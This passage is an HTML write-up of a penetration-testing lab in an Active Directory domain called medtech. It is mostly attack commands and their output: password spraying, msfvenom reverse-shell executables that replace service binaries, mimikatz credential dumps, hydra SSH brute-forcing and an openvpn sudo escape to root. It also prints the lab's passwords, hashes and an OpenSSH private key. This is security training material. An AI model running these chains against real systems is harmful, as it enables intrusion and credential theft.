+joe
+krbtgt
+leon
+mario
+offsec
+peach
+wario
+yoshi</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 crackmapexec smb IPs -u users.txt -p passwords.txt --continue-on-success
+...
+SMB         172.16.190.10   445    DC01             [+] medtech.com\wario:Mushroom! 
+...
+SMB         172.16.190.82   445    CLIENT01         [+] medtech.com\yoshi:Mushroom! <u>(Pwn3d!)</u>
+...</code></pre></div>
+
+<p class="text">Yoshi and wario share the password! And the yoshi is a dominant user for CLINET01.</p>
+
+<p class="text">Let's clearify the access privilege.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 crackmapexec smb IPs -u yoshi -p 'Mushroom!'         
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SMB         172.16.190.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
+SMB         172.16.190.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.10   445    DC01             [+] medtech.com\yoshi:Mushroom! 
+SMB         172.16.190.83   445    CLIENT02         [+] medtech.com\yoshi:Mushroom! 
+SMB         172.16.190.82   445    CLIENT01         [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
+SMB         172.16.190.12   445    DEV04            [+] medtech.com\yoshi:Mushroom! 
+SMB         172.16.190.13   445    PROD01           [+] medtech.com\yoshi:Mushroom! 
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 crackmapexec smb IPs -u wario -p 'Mushroom!'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SMB         172.16.190.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
+SMB         172.16.190.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.13   445    PROD01           [+] medtech.com\wario:Mushroom! 
+SMB         172.16.190.10   445    DC01             [+] medtech.com\wario:Mushroom! 
+SMB         172.16.190.12   445    DEV04            [+] medtech.com\wario:Mushroom! 
+SMB         172.16.190.83   445    CLIENT02         [+] medtech.com\wario:Mushroom! 
+SMB         172.16.190.82   445    CLIENT01         [+] medtech.com\wario:Mushroom!</code></pre></div>
+
+
+<h2 class="subtitle">.82</h2>
+<p class="text">Yoshi might be better to logon. Let's finish easy one : CLIENT01(.82).</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 impacket-psexec yoshi:'Mushroom!'@172.16.190.82 cmd
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </code></pre></div>
+
+
+<h2 class="subtitle">.83</h2>
+<p class="text">Since yoshi and wario are valid user for it, we can access .83 easily.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 evil-winrm -i 172.16.190.83 -u wario -p 'Mushroom!'                              
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\wario\Documents></code></pre></div>
+<p class="text">I found interesting folder under the root dir C:\</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\DevelopmentExecutables> dir
+
+
+    Directory: C:\DevelopmentExecutables
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         10/5/2022  11:05 PM          25600 auditTracker.exe</code></pre></div>
+
+<p class="text">Let's see its DACL.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\DevelopmentExecutables> get-acl auditTracker.exe
+
+
+    Directory: C:\DevelopmentExecutables
+
+
+Path             Owner                  Access
+----             -----                  ------
+auditTracker.exe BUILTIN\Administrators Everyone Allow  FullControl...</code></pre></div>
+<p class="text">Since we can modify it, we can overwrite the file. Let's create reverse shell.exe file and replace.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.226 LPORT=4444 -f exe -o auditTracker.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: auditTracker.exe</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 impacket-smbserver share . -smb2support -username u -password p
+[proxychains] config file found: /etc/proxychains4.conf</code></pre></div>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\DevelopmentExecutables> net use \\192.168.45.226\share /user:u p
+The command completed successfully.
+*Evil-WinRM* PS C:\DevelopmentExecutables> copy \\192.168.45.226\share\auditTracker.exe auditTracker.exe</code></pre></div>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\DevelopmentExecutables> sc.exe config auditTracker binPath="C:\developmentexecutables\auditTracker.exe"
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\DevelopmentExecutables> sc.exe start auditTracker</code></pre></div>
+
+<p class="text">I got reverse shell.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.226] from (UNKNOWN) [192.168.190.121] 64009
+Microsoft Windows [Version 10.0.22000.978]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system</code></pre></div>
+
+<h2 class="subtitle">.12</h2>
+<p class="text">Since the RPD is open, we can use rdesktop.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 rdesktop -u yoshi -p 'Mushroom!' 172.16.115.12     
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Autoselecting keyboard map 'en-us' from locale
+Core(error): tcp_connect(), unable to connect to 172.16.115.12</code></pre></div>
+<p class="text">However, it rejected. We have alternative tool <u>remmina</u>.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 remmina                  
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+remmina-Message: 03:00:49.243: Remmina does not log all output statements. Turn on more verbose output by using "G_MESSAGES_DEBUG=remmina" as an environment variable.
+...</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/medtech/4.png' %}" alt="">
+    <p class="text">It successfully worked. We can logon as yoshi with password 'Mushroom!'. Also, we need to specify domain name medtech.</p>
+</div>
+<div class="img">
+    <img src="{% static 'EthHack/images/medtech/5.png' %}" alt="">
+    <p class="text">Opening yoshi's desktop, I found local flag. Let's keep research.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/medtech/6.png' %}" alt="">
+    <p class="text">I found exe file which is modifiable for user yoshi again. We can get authority account like before.</p>
+</div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.226 LPORT=443 -f exe -o backup.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: backup.exe
+
+┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 impacket-smbserver share . -smb2support -username u -password p
+[proxychains] config file found: /etc/proxychains4.conf</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/medtech/7.png' %}" alt="">
+    <p class="text">We got reverse shell from nt authority\system user. We can get proof.txt.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ nc -lvnp 443 
+listening on [any] 443 ...
+connect to [192.168.45.226] from (UNKNOWN) [192.168.190.121] 64687
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32></code></pre></div>
+
+<p class="text">Also, we can perform mimikatz as always we do.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1/box9]
+└─$ cat mimikatz.txt
+         * Username : <u>leon</u>
+         * Domain   : MEDTECH
+         * NTLM     : 2e208ad146efda5bc44869025e06544a
+         * SHA1     : 8d1c9e13d2d2c20dbee8b4eacb20b73f06573c96
+         * DPAPI    : a7bad14f64c3cf0d7ae2b5f6392a0b6d
+        tspkg :
+        wdigest :
+         * Username : leon
+         * Domain   : MEDTECH
+         * Password : (null)
+        kerberos :
+         * Username : leon
+         * Domain   : MEDTECH.COM
+         * Password : <u>rabbit:)</u>
+        ssp :
+        credman :
+        cloudap :</code></pre></div>
+<p class="text">I found credential for leon.</p>
+
+<h2 class="subtitle">Enumeration with Leon's credential</h2>
+<p class="text">We haven't pwned box 01, 03, 05, 07, and 08 now. But 03 and 05 are not part of AD. Therefore, the target would be 01, 07 and 08.</p>
+<p class="text">Also, BOX8 uses ssh as remote protocol. So there are few stuff we can do.</p>
+<p class="text">Therefore, I'll target 172..16.xxx.10(DC01) and 172.16.xxx.13(PROD01).</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ cat IPs                      
+172.16.190.10
+172.16.190.13
+
+┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ <u>proxychains4 crackmapexec smb IPs -u leon -p 'rabbit:)'</u>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SMB         172.16.129.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
+SMB         172.16.129.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.129.10   445    DC01             [+] medtech.com\leon:rabbit:) (Pwn3d!)
+SMB         172.16.129.13   445    PROD01           [+] medtech.com\leon:rabbit:) (Pwn3d!)</code></pre></div>
+
+<p class="text">Fortunately, the leon is domimant user on both computer. Let's get flags.</p>
+
+
+<h2 class="subtitle">PROD01</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ proxychains4 evil-winrm -i 172.16.129.13 -u leon -p 'rabbit:)'                   
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\leon\Documents></code></pre></div>
+<p class="text">We have proof.txt under the C:\users\administrator\desktop.</p>
+
+<h2 class="subtitle">DC01</h2>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\administrator\desktop> dir
+
+
+    Directory: C:\Users\administrator\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/29/2022   2:41 PM             30 credentials.txt
+-a----        11/16/2025   8:34 AM             34 proof.txt</code></pre></div>
+
+<p class="text">We have proof.txt. Additionally, there is a file named credentials.txt.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\administrator\desktop> type credentials.txt
+web01: offsec/century62hisan51</code></pre></div>
+
+
+<p class="text">Luckily, we have free credential for web01. web01 would be BOX03 since it host http.</p>
+
+<h2 class="subtitle">WEB01 : BOX3</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ ssh offsec@192.168.129.120                              
+The authenticity of host '192.168.129.120 (192.168.129.120)' can't be established.
+ED25519 key fingerprint is SHA256:eCn6eNbHBenuePzdLNZ1/rbL9F5gRgqdZZpYOkszucA.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:23: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.129.120' (ED25519) to the list of known hosts.
+offsec@192.168.129.120's password: 
+Linux WEB01 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Dec  1 02:15:01 2022
+offsec@WEB01:~$</code></pre></div>
+
+<p class="text">I successfully logged on to WEB01.</p>
+<div class="code-box"><pre><code>offsec@WEB01:~$ hostname
+WEB01</code></pre></div>
+
+<p class="text">Also, we can sudo all command.</p>
+<div class="code-box"><pre><code>offsec@WEB01:~$ sudo -l
+Matching Defaults entries for offsec on WEB01:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User offsec may run the following commands on WEB01:
+    (ALL) NOPASSWD: ALL
+    (ALL : ALL) NOPASSWD: ALL</code></pre></div>
+
+    <p class="text">Let's become root user.</p>
+    <div class="code-box"><pre><code>offsec@WEB01:~$ sudo bash
+root@WEB01:~# ls
+gems  proof.txt  _site  startup.py</code></pre></div>
+
+<p class="text">We got WEB01!</p>
+
+
+<h2 class="subtitle">BOX05 : ?????</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ <u>proxychains4 ssh offsec@172.16.129.14</u>                                           
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+The authenticity of host '172.16.129.14 (172.16.129.14)' can't be established.
+ED25519 key fingerprint is SHA256:srLYZlCKeyOeH0XD62lR2XSoBZ/uqQ/tVS/YVLY3bF8.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:21: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.16.129.14' (ED25519) to the list of known hosts.
+offsec@172.16.129.14's password: 
+Permission denied, please try again.</code></pre></div>
+<p class="text">Though we got credential for several user, there is no valid credential for BOX05's ssh. Since we have user list for brute-forcing, let's do it with hydra.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ cat pass.txt 
+rabbit:)
+Mushroom!
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ cat users.txt
+joe
+leon
+mario
+offsec
+peach
+wario
+yoshi
+
+┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ hydra -L users.txt -P pass.txt 192.168.129.120 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-16 09:12:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:7/p:2), ~1 try per task
+[DATA] attacking ssh://192.168.129.120:22/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-16 09:12:34</code></pre></div>
+
+<p class="text">However, there is no password reuse.</p>
+<p class="text">Since we haven't used the users mario, offsec and peach, we can check their password.</p>
+<p class="text">Also, it's impossible to test all possible patterns in rockyou. Therefore, I'll try first 100 words in rockyou.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ head -n 100 /usr/share/wordlists/rockyou.txt > top100.txt 
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ hydra -L users.txt -P top100.txt 192.168.129.122 ssh 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-16 09:19:50
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 300 login tries (l:3/p:100), ~19 tries per task
+[DATA] attacking ssh://192.168.129.122:22/
+[22][ssh] host: 192.168.129.122   login: <u>offsec</u>   password: <u>password</u></code></pre></div>
+
+<p class="text">Bingo! We can logon to the target machine with offsec:password.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ <u>ssh offsec@192.168.129.122</u>
+The authenticity of host '192.168.129.122 (192.168.129.122)' can't be established.
+ED25519 key fingerprint is SHA256:udGiqS5CWuVlHprkRFQ8yQLekVjoJKlrAiv3UTP6POo.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:18: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.129.122' (ED25519) to the list of known hosts.
+offsec@192.168.129.122's password: 
+Last login: Tue Feb 11 01:48:54 2025
+(lshell) - You are in a limited shell.
+Type '?' or 'help' to get the list of allowed commands
+offsec:~$ <u>sudo -l</u>
+[sudo] password for offsec: 
+Matching Defaults entries for offsec on vpn:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User offsec may run the following commands on vpn:
+    (ALL : ALL) /usr/sbin/openvpn</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/medtech/8.png' %}" alt="">
+        <p class="text">According to the GTFOBins, we can use this code to get root shell.</p>
+    </div>
+
+    <div class="code-box"><pre><code>offsec:~$ <u>sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'</u>
+2025-11-16 14:23:35 Cipher negotiation is disabled since neither P2MP client nor server mode is enabled
+2025-11-16 14:23:35 OpenVPN 2.5.5 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Mar 22 2022
+2025-11-16 14:23:35 library versions: OpenSSL 3.0.2 15 Mar 2022, LZO 2.10
+2025-11-16 14:23:35 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
+2025-11-16 14:23:35 ******* WARNING *******: All encryption and authentication features disabled -- All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
+2025-11-16 14:23:35 /bin/sh -c sh null 1500 1500   init
+# id
+uid=0(<u>root</u>) gid=0(root) groups=0(root)</code></pre></div>
+<p class="text">We have local.txt on the /home/offsec, and proof.txt on /root.</p>
+<p class="text">Also, there is a id_rsa file for mario under the /home/mario/.ssh folder.</p>
+<div class="code-box"><pre><code># ls
+id_rsa  id_rsa.pub  known_hosts  known_hosts.old</code></pre></div>
+
+<p class="text">We may be able to access BOX08 using this id_rsa key. Let's copy and paste this and use it for BOX8.</p>
+<div class="code-box"><pre><code># cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+pI77A9Emp3E9cAAAAJbWFyaW9AdnBuAQI=
+-----END OPENSSH PRIVATE KEY-----</code></pre></div>
+
+<h2 class="subtitle">BOX8 : NTP</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1/box5]
+└─$ chmod 600 id_rsa               
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab1/box5]
+└─$ proxychains4 ssh -i id_rsa mario@172.16.129.14                
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Linux NTP 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Oct  6 11:35:48 2022 from 192.168.118.2
+$ id
+uid=1001(mario) gid=1001(mario) groups=1001(mario)</code></pre></div>
+
+<p class="text">We can get local.txt. Since we've collected all 14 flags, we cannot pwn this box.</p>
+
+  BOX1 :DC01 : proof.txt
+  BOX2 :FILES02 : Local.txt, Proof.txt
+  BOX3 :WEB01 : proof.txt
+  BOX4 :WEB03 : proof.txt
+  BOX5 :????? : local.txt proof.txt
+  BOX6 :DEV02 : local.txt proof.txt 
+  BOX7 :PROD01: proof.txt
+  BOX8 :NTP  : local.txt
+  BOX9 :CLIENT01 : proof.txt
+  BOX10:CLIENT02 : local.txt, proof.txt
+</body>
+</html>
